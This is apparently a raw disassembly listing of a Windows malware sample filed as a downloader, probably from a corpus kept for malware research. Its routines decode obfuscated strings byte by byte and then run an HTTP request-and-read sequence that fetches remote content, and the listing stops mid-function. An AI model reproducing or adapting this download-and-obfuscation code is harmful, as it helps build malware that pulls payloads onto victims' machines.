
malware_samples/downloader/6fc54151607a82d5f4fae661ef0b7b0767d325f5935ed6139f8932bc27309202.exe:     file format pei-x86-64


Disassembly of section .text:

0000000180001000 <.text>:
   180001000:	48 8d 05 21 05 02 00 	lea    0x20521(%rip),%rax        # 0x180021528
   180001007:	c3                   	ret
   180001008:	cc                   	int3
   180001009:	cc                   	int3
   18000100a:	cc                   	int3
   18000100b:	cc                   	int3
   18000100c:	cc                   	int3
   18000100d:	cc                   	int3
   18000100e:	cc                   	int3
   18000100f:	cc                   	int3
   180001010:	40 53                	rex push %rbx
   180001012:	55                   	push   %rbp
   180001013:	56                   	push   %rsi
   180001014:	57                   	push   %rdi
   180001015:	41 54                	push   %r12
   180001017:	41 55                	push   %r13
   180001019:	41 56                	push   %r14
   18000101b:	48 81 ec 90 03 00 00 	sub    $0x390,%rsp
   180001022:	48 8b 05 df df 01 00 	mov    0x1dfdf(%rip),%rax        # 0x18001f008
   180001029:	48 33 c4             	xor    %rsp,%rax
   18000102c:	48 89 84 24 80 03 00 	mov    %rax,0x380(%rsp)
   180001033:	00 
   180001034:	4c 8b e1             	mov    %rcx,%r12
   180001037:	48 8d bc 24 60 01 00 	lea    0x160(%rsp),%rdi
   18000103e:	00 
   18000103f:	33 c0                	xor    %eax,%eax
   180001041:	b9 04 01 00 00       	mov    $0x104,%ecx
   180001046:	f3 aa                	rep stos %al,(%rdi)
   180001048:	b9 8b 00 00 00       	mov    $0x8b,%ecx
   18000104d:	4d 8b e8             	mov    %r8,%r13
   180001050:	48 8b ea             	mov    %rdx,%rbp
   180001053:	e8 7c 2b 00 00       	call   0x180003bd4
   180001058:	4c 8b d0             	mov    %rax,%r10
   18000105b:	48 8d 35 9e ef ff ff 	lea    -0x1062(%rip),%rsi        # 0x180000000
   180001062:	48 8b f8             	mov    %rax,%rdi
   180001065:	b9 8b 00 00 00       	mov    $0x8b,%ecx
   18000106a:	33 c0                	xor    %eax,%eax
   18000106c:	49 8b d2             	mov    %r10,%rdx
   18000106f:	f3 aa                	rep stos %al,(%rdi)
   180001071:	33 db                	xor    %ebx,%ebx
   180001073:	8b cb                	mov    %ebx,%ecx
   180001075:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   18000107c:	00 00 00 00 
   180001080:	0f b6 84 31 60 ff 01 	movzbl 0x1ff60(%rcx,%rsi,1),%eax
   180001087:	00 
   180001088:	48 83 c1 03          	add    $0x3,%rcx
   18000108c:	88 02                	mov    %al,(%rdx)
   18000108e:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   180001092:	48 81 f9 9e 01 00 00 	cmp    $0x19e,%rcx
   180001099:	7c e5                	jl     0x180001080
   18000109b:	45 33 c9             	xor    %r9d,%r9d
   18000109e:	4c 89 bc 24 e8 03 00 	mov    %r15,0x3e8(%rsp)
   1800010a5:	00 
   1800010a6:	45 33 c0             	xor    %r8d,%r8d
   1800010a9:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   1800010ad:	33 d2                	xor    %edx,%edx
   1800010af:	49 8b ca             	mov    %r10,%rcx
   1800010b2:	ff 15 e0 32 01 00    	call   *0x132e0(%rip)        # 0x180014398
   1800010b8:	4c 8b f0             	mov    %rax,%r14
   1800010bb:	48 85 c0             	test   %rax,%rax
   1800010be:	0f 84 9a 03 00 00    	je     0x18000145e
   1800010c4:	b9 17 00 00 00       	mov    $0x17,%ecx
   1800010c9:	e8 06 2b 00 00       	call   0x180003bd4
   1800010ce:	4c 8b d0             	mov    %rax,%r10
   1800010d1:	48 8b f8             	mov    %rax,%rdi
   1800010d4:	33 c0                	xor    %eax,%eax
   1800010d6:	b9 17 00 00 00       	mov    $0x17,%ecx
   1800010db:	f3 aa                	rep stos %al,(%rdi)
   1800010dd:	49 8b fa             	mov    %r10,%rdi
   1800010e0:	48 8b d3             	mov    %rbx,%rdx
   1800010e3:	0f 1f 40 00          	nopl   0x0(%rax)
   1800010e7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1800010ee:	00 00 
   1800010f0:	0f b6 8c 32 00 fa 01 	movzbl 0x1fa00(%rdx,%rsi,1),%ecx
   1800010f7:	00 
   1800010f8:	48 83 c2 03          	add    $0x3,%rdx
   1800010fc:	88 0f                	mov    %cl,(%rdi)
   1800010fe:	48 8d 7f 01          	lea    0x1(%rdi),%rdi
   180001102:	48 83 fa 42          	cmp    $0x42,%rdx
   180001106:	7c e8                	jl     0x1800010f0
   180001108:	44 0f b7 05 34 e9 01 	movzwl 0x1e934(%rip),%r8d        # 0x18001fa44
   18000110f:	00 
   180001110:	45 33 c9             	xor    %r9d,%r9d
   180001113:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   180001118:	49 8b d2             	mov    %r10,%rdx
   18000111b:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   18000111f:	49 8b ce             	mov    %r14,%rcx
   180001122:	c7 44 24 28 03 00 00 	movl   $0x3,0x28(%rsp)
   180001129:	00 
   18000112a:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   18000112f:	ff 15 2b 32 01 00    	call   *0x1322b(%rip)        # 0x180014360
   180001135:	4c 8b f8             	mov    %rax,%r15
   180001138:	48 85 c0             	test   %rax,%rax
   18000113b:	0f 84 14 03 00 00    	je     0x180001455
   180001141:	b9 12 00 00 00       	mov    $0x12,%ecx
   180001146:	e8 89 2a 00 00       	call   0x180003bd4
   18000114b:	48 8b f0             	mov    %rax,%rsi
   18000114e:	48 8b f8             	mov    %rax,%rdi
   180001151:	33 c0                	xor    %eax,%eax
   180001153:	b9 12 00 00 00       	mov    $0x12,%ecx
   180001158:	f3 aa                	rep stos %al,(%rdi)
   18000115a:	48 8b fe             	mov    %rsi,%rdi
   18000115d:	48 8d 05 9c ee ff ff 	lea    -0x1164(%rip),%rax        # 0x180000000
   180001164:	48 8b d3             	mov    %rbx,%rdx
   180001167:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   18000116e:	00 00 
   180001170:	0f b6 8c 02 48 fb 01 	movzbl 0x1fb48(%rdx,%rax,1),%ecx
   180001177:	00 
   180001178:	48 83 c2 03          	add    $0x3,%rdx
   18000117c:	88 0f                	mov    %cl,(%rdi)
   18000117e:	48 8d 7f 01          	lea    0x1(%rdi),%rdi
   180001182:	48 83 fa 33          	cmp    $0x33,%rdx
   180001186:	7c e8                	jl     0x180001170
   180001188:	b9 05 00 00 00       	mov    $0x5,%ecx
   18000118d:	e8 42 2a 00 00       	call   0x180003bd4
   180001192:	4c 8b d0             	mov    %rax,%r10
   180001195:	48 8b f8             	mov    %rax,%rdi
   180001198:	33 c0                	xor    %eax,%eax
   18000119a:	b9 05 00 00 00       	mov    $0x5,%ecx
   18000119f:	f3 aa                	rep stos %al,(%rdi)
   1800011a1:	49 8b fa             	mov    %r10,%rdi
   1800011a4:	48 8d 05 55 ee ff ff 	lea    -0x11ab(%rip),%rax        # 0x180000000
   1800011ab:	48 8b d3             	mov    %rbx,%rdx
   1800011ae:	66 90                	xchg   %ax,%ax
   1800011b0:	0f b6 8c 02 88 01 02 	movzbl 0x20188(%rdx,%rax,1),%ecx
   1800011b7:	00 
   1800011b8:	48 83 c2 03          	add    $0x3,%rdx
   1800011bc:	88 0f                	mov    %cl,(%rdi)
   1800011be:	48 8d 7f 01          	lea    0x1(%rdi),%rdi
   1800011c2:	48 83 fa 0c          	cmp    $0xc,%rdx
   1800011c6:	7c e8                	jl     0x1800011b0
   1800011c8:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   1800011cd:	45 33 c9             	xor    %r9d,%r9d
   1800011d0:	c7 44 24 30 00 00 80 	movl   $0x800000,0x30(%rsp)
   1800011d7:	00 
   1800011d8:	4c 8b c6             	mov    %rsi,%r8
   1800011db:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   1800011e0:	49 8b d2             	mov    %r10,%rdx
   1800011e3:	49 8b cf             	mov    %r15,%rcx
   1800011e6:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1800011eb:	ff 15 7f 31 01 00    	call   *0x1317f(%rip)        # 0x180014370
   1800011f1:	48 8b f0             	mov    %rax,%rsi
   1800011f4:	48 85 c0             	test   %rax,%rax
   1800011f7:	0f 84 4f 02 00 00    	je     0x18000144c
   1800011fd:	b9 10 00 00 00       	mov    $0x10,%ecx
   180001202:	e8 cd 29 00 00       	call   0x180003bd4
   180001207:	4c 8b c8             	mov    %rax,%r9
   18000120a:	48 8b f8             	mov    %rax,%rdi
   18000120d:	33 c0                	xor    %eax,%eax
   18000120f:	b9 10 00 00 00       	mov    $0x10,%ecx
   180001214:	f3 aa                	rep stos %al,(%rdi)
   180001216:	48 8b fb             	mov    %rbx,%rdi
   180001219:	48 8d 05 e0 ed ff ff 	lea    -0x1220(%rip),%rax        # 0x180000000
   180001220:	4d 8b c1             	mov    %r9,%r8
   180001223:	0f 1f 40 00          	nopl   0x0(%rax)
   180001227:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   18000122e:	00 00 
   180001230:	0f b6 94 07 78 fc 01 	movzbl 0x1fc78(%rdi,%rax,1),%edx
   180001237:	00 
   180001238:	48 83 c7 03          	add    $0x3,%rdi
   18000123c:	41 88 10             	mov    %dl,(%r8)
   18000123f:	4d 8d 40 01          	lea    0x1(%r8),%r8
   180001243:	48 83 ff 2d          	cmp    $0x2d,%rdi
   180001247:	7c e7                	jl     0x180001230
   180001249:	4c 8b c5             	mov    %rbp,%r8
   18000124c:	48 8d 8c 24 60 01 00 	lea    0x160(%rsp),%rcx
   180001253:	00 
   180001254:	49 8b d1             	mov    %r9,%rdx
   180001257:	e8 d4 0c 00 00       	call   0x180001f30
   18000125c:	33 c0                	xor    %eax,%eax
   18000125e:	48 8d 7c 24 50       	lea    0x50(%rsp),%rdi
   180001263:	b9 04 01 00 00       	mov    $0x104,%ecx
   180001268:	f3 aa                	rep stos %al,(%rdi)
   18000126a:	8d 48 1b             	lea    0x1b(%rax),%ecx
   18000126d:	e8 62 29 00 00       	call   0x180003bd4
   180001272:	4c 8b c8             	mov    %rax,%r9
   180001275:	48 8d 2d 84 ed ff ff 	lea    -0x127c(%rip),%rbp        # 0x180000000
   18000127c:	48 8b f8             	mov    %rax,%rdi
   18000127f:	b9 1b 00 00 00       	mov    $0x1b,%ecx
   180001284:	33 c0                	xor    %eax,%eax
   180001286:	48 8b d3             	mov    %rbx,%rdx
   180001289:	f3 aa                	rep stos %al,(%rdi)
   18000128b:	49 8b f9             	mov    %r9,%rdi
   18000128e:	66 90                	xchg   %ax,%ax
   180001290:	0f b6 8c 2a 80 fb 01 	movzbl 0x1fb80(%rdx,%rbp,1),%ecx
   180001297:	00 
   180001298:	48 83 c2 03          	add    $0x3,%rdx
   18000129c:	88 0f                	mov    %cl,(%rdi)
   18000129e:	48 8d 7f 01          	lea    0x1(%rdi),%rdi
   1800012a2:	48 83 fa 4e          	cmp    $0x4e,%rdx
   1800012a6:	7c e8                	jl     0x180001290
   1800012a8:	4d 8b c4             	mov    %r12,%r8
   1800012ab:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1800012b0:	49 8b d1             	mov    %r9,%rdx
   1800012b3:	e8 78 0c 00 00       	call   0x180001f30
   1800012b8:	41 b9 00 00 00 20    	mov    $0x20000000,%r9d
   1800012be:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1800012c3:	41 83 c8 ff          	or     $0xffffffff,%r8d
   1800012c7:	48 8b ce             	mov    %rsi,%rcx
   1800012ca:	ff 15 98 30 01 00    	call   *0x13098(%rip)        # 0x180014368
   1800012d0:	b9 12 00 00 00       	mov    $0x12,%ecx
   1800012d5:	e8 fa 28 00 00       	call   0x180003bd4
   1800012da:	4c 8b c0             	mov    %rax,%r8
   1800012dd:	48 8b f8             	mov    %rax,%rdi
   1800012e0:	33 c0                	xor    %eax,%eax
   1800012e2:	b9 12 00 00 00       	mov    $0x12,%ecx
   1800012e7:	f3 aa                	rep stos %al,(%rdi)
   1800012e9:	49 8b f8             	mov    %r8,%rdi
   1800012ec:	48 8b d3             	mov    %rbx,%rdx
   1800012ef:	90                   	nop
   1800012f0:	0f b6 8c 2a d8 fc 01 	movzbl 0x1fcd8(%rdx,%rbp,1),%ecx
   1800012f7:	00 
   1800012f8:	48 83 c2 03          	add    $0x3,%rdx
   1800012fc:	88 0f                	mov    %cl,(%rdi)
   1800012fe:	48 8d 7f 01          	lea    0x1(%rdi),%rdi
   180001302:	48 83 fa 33          	cmp    $0x33,%rdx
   180001306:	7c e8                	jl     0x1800012f0
   180001308:	4c 8d 8c 24 60 01 00 	lea    0x160(%rsp),%r9
   18000130f:	00 
   180001310:	48 8d 15 99 ab 01 00 	lea    0x1ab99(%rip),%rdx        # 0x18001beb0
   180001317:	48 8d 8c 24 70 02 00 	lea    0x270(%rsp),%rcx
   18000131e:	00 
   18000131f:	e8 0c 0c 00 00       	call   0x180001f30
   180001324:	41 b9 00 00 00 20    	mov    $0x20000000,%r9d
   18000132a:	48 8d 94 24 70 02 00 	lea    0x270(%rsp),%rdx
   180001331:	00 
   180001332:	41 83 c8 ff          	or     $0xffffffff,%r8d
   180001336:	48 8b ce             	mov    %rsi,%rcx
   180001339:	ff 15 29 30 01 00    	call   *0x13029(%rip)        # 0x180014368
   18000133f:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   180001344:	c7 44 24 48 04 00 00 	movl   $0x4,0x48(%rsp)
   18000134b:	00 
   18000134c:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   180001351:	ba 1f 00 00 00       	mov    $0x1f,%edx
   180001356:	48 8b ce             	mov    %rsi,%rcx
   180001359:	ff 15 21 30 01 00    	call   *0x13021(%rip)        # 0x180014380
   18000135f:	81 4c 24 40 80 01 00 	orl    $0x180,0x40(%rsp)
   180001366:	00 
   180001367:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   18000136c:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   180001372:	48 8b ce             	mov    %rsi,%rcx
   180001375:	41 8d 51 1b          	lea    0x1b(%r9),%edx
   180001379:	ff 15 09 30 01 00    	call   *0x13009(%rip)        # 0x180014388
   18000137f:	b9 40 00 00 00       	mov    $0x40,%ecx
   180001384:	e8 4b 28 00 00       	call   0x180003bd4
   180001389:	48 8b f8             	mov    %rax,%rdi
   18000138c:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   180001390:	4c 8b e0             	mov    %rax,%r12
   180001393:	b9 40 00 00 00       	mov    $0x40,%ecx
   180001398:	33 c0                	xor    %eax,%eax
   18000139a:	45 33 c9             	xor    %r9d,%r9d
   18000139d:	f3 aa                	rep stos %al,(%rdi)
   18000139f:	48 8b ce             	mov    %rsi,%rcx
   1800013a2:	c7 44 24 4c 40 00 00 	movl   $0x40,0x4c(%rsp)
   1800013a9:	00 
   1800013aa:	45 33 c0             	xor    %r8d,%r8d
   1800013ad:	33 d2                	xor    %edx,%edx
   1800013af:	ff 15 9b 2f 01 00    	call   *0x12f9b(%rip)        # 0x180014350
   1800013b5:	48 8b ce             	mov    %rsi,%rcx
   1800013b8:	85 c0                	test   %eax,%eax
   1800013ba:	0f 84 86 00 00 00    	je     0x180001446
   1800013c0:	4c 8d 4c 24 4c       	lea    0x4c(%rsp),%r9
   1800013c5:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1800013ca:	4d 8b c4             	mov    %r12,%r8
   1800013cd:	ba 05 00 00 00       	mov    $0x5,%edx
   1800013d2:	ff 15 a0 2f 01 00    	call   *0x12fa0(%rip)        # 0x180014378
   1800013d8:	49 8b cc             	mov    %r12,%rcx
   1800013db:	8b e8                	mov    %eax,%ebp
   1800013dd:	e8 a2 65 00 00       	call   0x180007984
   1800013e2:	8b f8                	mov    %eax,%edi
   1800013e4:	85 c0                	test   %eax,%eax
   1800013e6:	74 5b                	je     0x180001443
   1800013e8:	85 ed                	test   %ebp,%ebp
   1800013ea:	74 57                	je     0x180001443
   1800013ec:	8b cf                	mov    %edi,%ecx
   1800013ee:	89 5c 24 44          	mov    %ebx,0x44(%rsp)
   1800013f2:	41 89 7d 00          	mov    %edi,0x0(%r13)
   1800013f6:	e8 d9 27 00 00       	call   0x180003bd4
   1800013fb:	48 8b e8             	mov    %rax,%rbp
   1800013fe:	66 90                	xchg   %ax,%ax
   180001400:	8b d3                	mov    %ebx,%edx
   180001402:	4c 8d 4c 24 44       	lea    0x44(%rsp),%r9
   180001407:	48 03 d5             	add    %rbp,%rdx
   18000140a:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   180001410:	48 8b ce             	mov    %rsi,%rcx
   180001413:	ff 15 77 2f 01 00    	call   *0x12f77(%rip)        # 0x180014390
   180001419:	03 5c 24 44          	add    0x44(%rsp),%ebx
   18000141d:	2b 7c 24 44          	sub    0x44(%rsp),%edi
   180001421:	75 dd                	jne    0x180001400
   180001423:	48 8b ce             	mov    %rsi,%rcx
   180001426:	ff 15 2c 2f 01 00    	call   *0x12f2c(%rip)        # 0x180014358
   18000142c:	49 8b cf             	mov    %r15,%rcx
   18000142f:	ff 15 23 2f 01 00    	call   *0x12f23(%rip)        # 0x180014358
   180001435:	49 8b ce             	mov    %r14,%rcx
   180001438:	ff 15 1a 2f 01 00    	call   *0x12f1a(%rip)        # 0x180014358
   18000143e:	48 8b c5             	mov    %rbp,%rax
   180001441:	eb 1d                	jmp    0x180001460
   180001443:	48 8b ce             	mov    %rsi,%rcx
   180001446:	ff 15 0c 2f 01 00    	call   *0x12f0c(%rip)        # 0x180014358
   18000144c:	49 8b cf             	mov    %r15,%rcx
   18000144f:	ff 15 03 2f 01 00    	call   *0x12f03(%rip)        # 0x180014358
   180001455:	49 8b ce             	mov    %r14,%rcx
   180001458:	ff 15 fa 2e 01 00    	call   *0x12efa(%rip)        # 0x180014358
   18000145e:	33 c0                	xor    %eax,%eax
   180001460:	4c 8b bc 24 e8 03 00 	mov    0x3e8(%rsp),%r15
   180001467:	00 
   180001468:	48 8b 8c 24 80 03 00 	mov    0x380(%rsp),%rcx
   18000146f:	00 
   180001470:	48 33 cc             	xor    %rsp,%rcx
   180001473:	e8 38 27 00 00       	call   0x180003bb0
   180001478:	48 81 c4 90 03 00 00 	add    $0x390,%rsp
   18000147f:	41 5e                	pop    %r14
   180001481:	41 5d                	pop    %r13
   180001483:	41 5c                	pop    %r12
   180001485:	5f                   	pop    %rdi
   180001486:	5e                   	pop    %rsi
   180001487:	5d                   	pop    %rbp
   180001488:	5b                   	pop    %rbx
   180001489:	c3                   	ret
   18000148a:	cc                   	int3
   18000148b:	cc                   	int3
   18000148c:	cc                   	int3
   18000148d:	cc                   	int3
   18000148e:	cc                   	int3
   18000148f:	cc                   	int3
   180001490:	40 53                	rex push %rbx
   180001492:	55                   	push   %rbp
   180001493:	56                   	push   %rsi
   180001494:	57                   	push   %rdi
   180001495:	41 54                	push   %r12
   180001497:	41 55                	push   %r13
   180001499:	41 57                	push   %r15
   18000149b:	48 81 ec a0 03 00 00 	sub    $0x3a0,%rsp
   1800014a2:	48 8b 05 5f db 01 00 	mov    0x1db5f(%rip),%rax        # 0x18001f008
   1800014a9:	48 33 c4             	xor    %rsp,%rax
   1800014ac:	48 89 84 24 80 03 00 	mov    %rax,0x380(%rsp)
   1800014b3:	00 
   1800014b4:	4c 8b e1             	mov    %rcx,%r12
   1800014b7:	44 89 44 24 40       	mov    %r8d,0x40(%rsp)
   1800014bc:	33 c0                	xor    %eax,%eax
   1800014be:	48 8d bc 24 60 01 00 	lea    0x160(%rsp),%rdi
   1800014c5:	00 
   1800014c6:	b9 04 01 00 00       	mov    $0x104,%ecx
   1800014cb:	4d 8b f9             	mov    %r9,%r15
   1800014ce:	f3 aa                	rep stos %al,(%rdi)
   1800014d0:	b9 8b 00 00 00       	mov    $0x8b,%ecx
   1800014d5:	4c 8b ea             	mov    %rdx,%r13
   1800014d8:	e8 f7 26 00 00       	call   0x180003bd4
   1800014dd:	4c 8b d0             	mov    %rax,%r10
   1800014e0:	48 8d 2d 19 eb ff ff 	lea    -0x14e7(%rip),%rbp        # 0x180000000
   1800014e7:	48 8b f8             	mov    %rax,%rdi
   1800014ea:	b9 8b 00 00 00       	mov    $0x8b,%ecx
   1800014ef:	33 c0                	xor    %eax,%eax
   1800014f1:	49 8b d2             	mov    %r10,%rdx
   1800014f4:	f3 aa                	rep stos %al,(%rdi)
   1800014f6:	33 db                	xor    %ebx,%ebx
   1800014f8:	8b cb                	mov    %ebx,%ecx
   1800014fa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   180001500:	0f b6 84 29 60 ff 01 	movzbl 0x1ff60(%rcx,%rbp,1),%eax
   180001507:	00 
   180001508:	48 83 c1 03          	add    $0x3,%rcx
   18000150c:	88 02                	mov    %al,(%rdx)
   18000150e:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   180001512:	48 81 f9 9e 01 00 00 	cmp    $0x19e,%rcx
   180001519:	7c e5                	jl     0x180001500
   18000151b:	45 33 c9             	xor    %r9d,%r9d
   18000151e:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   180001522:	45 33 c0             	xor    %r8d,%r8d
   180001525:	33 d2                	xor    %edx,%edx
   180001527:	49 8b ca             	mov    %r10,%rcx
   18000152a:	ff 15 68 2e 01 00    	call   *0x12e68(%rip)        # 0x180014398
   180001530:	48 8b f0             	mov    %rax,%rsi
   180001533:	48 85 c0             	test   %rax,%rax
   180001536:	0f 84 9e 03 00 00    	je     0x1800018da
   18000153c:	b9 17 00 00 00       	mov    $0x17,%ecx
   180001541:	4c 89 b4 24 98 03 00 	mov    %r14,0x398(%rsp)
   180001548:	00 
   180001549:	e8 86 26 00 00       	call   0x180003bd4
   18000154e:	4c 8b d0             	mov    %rax,%r10
   180001551:	48 8b f8             	mov    %rax,%rdi
   180001554:	33 c0                	xor    %eax,%eax
   180001556:	b9 17 00 00 00       	mov    $0x17,%ecx
   18000155b:	f3 aa                	rep stos %al,(%rdi)
   18000155d:	49 8b fa             	mov    %r10,%rdi
   180001560:	48 8b d3             	mov    %rbx,%rdx
   180001563:	0f 1f 40 00          	nopl   0x0(%rax)
   180001567:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   18000156e:	00 00 
   180001570:	0f b6 8c 2a 00 fa 01 	movzbl 0x1fa00(%rdx,%rbp,1),%ecx
   180001577:	00 
   180001578:	48 83 c2 03          	add    $0x3,%rdx
   18000157c:	88 0f                	mov    %cl,(%rdi)
   18000157e:	48 8d 7f 01          	lea    0x1(%rdi),%rdi
   180001582:	48 83 fa 42          	cmp    $0x42,%rdx
   180001586:	7c e8                	jl     0x180001570
   180001588:	44 0f b7 05 b4 e4 01 	movzwl 0x1e4b4(%rip),%r8d        # 0x18001fa44
   18000158f:	00 
   180001590:	45 33 c9             	xor    %r9d,%r9d
   180001593:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   180001598:	49 8b d2             	mov    %r10,%rdx
   18000159b:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   18000159f:	48 8b ce             	mov    %rsi,%rcx
   1800015a2:	c7 44 24 28 03 00 00 	movl   $0x3,0x28(%rsp)
   1800015a9:	00 
   1800015aa:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1800015af:	ff 15 ab 2d 01 00    	call   *0x12dab(%rip)        # 0x180014360
   1800015b5:	4c 8b f0             	mov    %rax,%r14
   1800015b8:	48 85 c0             	test   %rax,%rax
   1800015bb:	0f 84 e4 02 00 00    	je     0x1800018a5
   1800015c1:	b9 10 00 00 00       	mov    $0x10,%ecx
   1800015c6:	e8 09 26 00 00       	call   0x180003bd4
   1800015cb:	48 8b e8             	mov    %rax,%rbp
   1800015ce:	48 8b f8             	mov    %rax,%rdi
   1800015d1:	33 c0                	xor    %eax,%eax
   1800015d3:	b9 10 00 00 00       	mov    $0x10,%ecx
   1800015d8:	f3 aa                	rep stos %al,(%rdi)
   1800015da:	48 8b fd             	mov    %rbp,%rdi
   1800015dd:	48 8d 05 1c ea ff ff 	lea    -0x15e4(%rip),%rax        # 0x180000000
   1800015e4:	48 8b d3             	mov    %rbx,%rdx
   1800015e7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1800015ee:	00 00 
   1800015f0:	0f b6 8c 02 a8 fc 01 	movzbl 0x1fca8(%rdx,%rax,1),%ecx
   1800015f7:	00 
   1800015f8:	48 83 c2 03          	add    $0x3,%rdx
   1800015fc:	88 0f                	mov    %cl,(%rdi)
   1800015fe:	48 8d 7f 01          	lea    0x1(%rdi),%rdi
   180001602:	48 83 fa 2d          	cmp    $0x2d,%rdx
   180001606:	7c e8                	jl     0x1800015f0
   180001608:	b9 05 00 00 00       	mov    $0x5,%ecx
   18000160d:	e8 c2 25 00 00       	call   0x180003bd4
   180001612:	4c 8b d0             	mov    %rax,%r10
   180001615:	48 8b f8             	mov    %rax,%rdi
   180001618:	33 c0                	xor    %eax,%eax
   18000161a:	b9 05 00 00 00       	mov    $0x5,%ecx
   18000161f:	f3 aa                	rep stos %al,(%rdi)
   180001621:	49 8b fa             	mov    %r10,%rdi
   180001624:	48 8d 05 d5 e9 ff ff 	lea    -0x162b(%rip),%rax        # 0x180000000
   18000162b:	48 8b d3             	mov    %rbx,%rdx
   18000162e:	66 90                	xchg   %ax,%ax
   180001630:	0f b6 8c 02 88 01 02 	movzbl 0x20188(%rdx,%rax,1),%ecx
   180001637:	00 
   180001638:	48 83 c2 03          	add    $0x3,%rdx
   18000163c:	88 0f                	mov    %cl,(%rdi)
   18000163e:	48 8d 7f 01          	lea    0x1(%rdi),%rdi
   180001642:	48 83 fa 0c          	cmp    $0xc,%rdx
   180001646:	7c e8                	jl     0x180001630
   180001648:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   18000164d:	45 33 c9             	xor    %r9d,%r9d
   180001650:	c7 44 24 30 00 00 80 	movl   $0x800000,0x30(%rsp)
   180001657:	00 
   180001658:	4c 8b c5             	mov    %rbp,%r8
   18000165b:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   180001660:	49 8b d2             	mov    %r10,%rdx
   180001663:	49 8b ce             	mov    %r14,%rcx
   180001666:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   18000166b:	ff 15 ff 2c 01 00    	call   *0x12cff(%rip)        # 0x180014370
   180001671:	48 8b e8             	mov    %rax,%rbp
   180001674:	48 85 c0             	test   %rax,%rax
   180001677:	0f 84 1f 02 00 00    	je     0x18000189c
   18000167d:	b9 5f 00 00 00       	mov    $0x5f,%ecx
   180001682:	e8 4d 25 00 00       	call   0x180003bd4
   180001687:	4c 8b c8             	mov    %rax,%r9
   18000168a:	48 8b f8             	mov    %rax,%rdi
   18000168d:	33 c0                	xor    %eax,%eax
   18000168f:	b9 5f 00 00 00       	mov    $0x5f,%ecx
   180001694:	f3 aa                	rep stos %al,(%rdi)
   180001696:	48 8b fb             	mov    %rbx,%rdi
   180001699:	48 8d 05 60 e9 ff ff 	lea    -0x16a0(%rip),%rax        # 0x180000000
   1800016a0:	4d 8b c1             	mov    %r9,%r8
   1800016a3:	0f 1f 40 00          	nopl   0x0(%rax)
   1800016a7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1800016ae:	00 00 
   1800016b0:	0f b6 94 07 e0 f8 01 	movzbl 0x1f8e0(%rdi,%rax,1),%edx
   1800016b7:	00 
   1800016b8:	48 83 c7 03          	add    $0x3,%rdi
   1800016bc:	41 88 10             	mov    %dl,(%r8)
   1800016bf:	4d 8d 40 01          	lea    0x1(%r8),%r8
   1800016c3:	48 81 ff 1a 01 00 00 	cmp    $0x11a,%rdi
   1800016ca:	7c e4                	jl     0x1800016b0
   1800016cc:	4d 8b c7             	mov    %r15,%r8
   1800016cf:	48 8d 8c 24 60 01 00 	lea    0x160(%rsp),%rcx
   1800016d6:	00 
   1800016d7:	49 8b d1             	mov    %r9,%rdx
   1800016da:	e8 51 08 00 00       	call   0x180001f30
   1800016df:	33 c0                	xor    %eax,%eax
   1800016e1:	48 8d 7c 24 50       	lea    0x50(%rsp),%rdi
   1800016e6:	b9 04 01 00 00       	mov    $0x104,%ecx
   1800016eb:	f3 aa                	rep stos %al,(%rdi)
   1800016ed:	8d 48 1b             	lea    0x1b(%rax),%ecx
   1800016f0:	e8 df 24 00 00       	call   0x180003bd4
   1800016f5:	4c 8b c8             	mov    %rax,%r9
   1800016f8:	4c 8d 3d 01 e9 ff ff 	lea    -0x16ff(%rip),%r15        # 0x180000000
   1800016ff:	48 8b f8             	mov    %rax,%rdi
   180001702:	b9 1b 00 00 00       	mov    $0x1b,%ecx
   180001707:	33 c0                	xor    %eax,%eax
   180001709:	48 8b d3             	mov    %rbx,%rdx
   18000170c:	f3 aa                	rep stos %al,(%rdi)
   18000170e:	49 8b f9             	mov    %r9,%rdi
   180001711:	42 0f b6 8c 3a 80 fb 	movzbl 0x1fb80(%rdx,%r15,1),%ecx
   180001718:	01 00 
   18000171a:	48 83 c2 03          	add    $0x3,%rdx
   18000171e:	88 0f                	mov    %cl,(%rdi)
   180001720:	48 8d 7f 01          	lea    0x1(%rdi),%rdi
   180001724:	48 83 fa 4e          	cmp    $0x4e,%rdx
   180001728:	7c e7                	jl     0x180001711
   18000172a:	4d 8b c4             	mov    %r12,%r8
   18000172d:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180001732:	49 8b d1             	mov    %r9,%rdx
   180001735:	e8 f6 07 00 00       	call   0x180001f30
   18000173a:	41 b9 00 00 00 20    	mov    $0x20000000,%r9d
   180001740:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
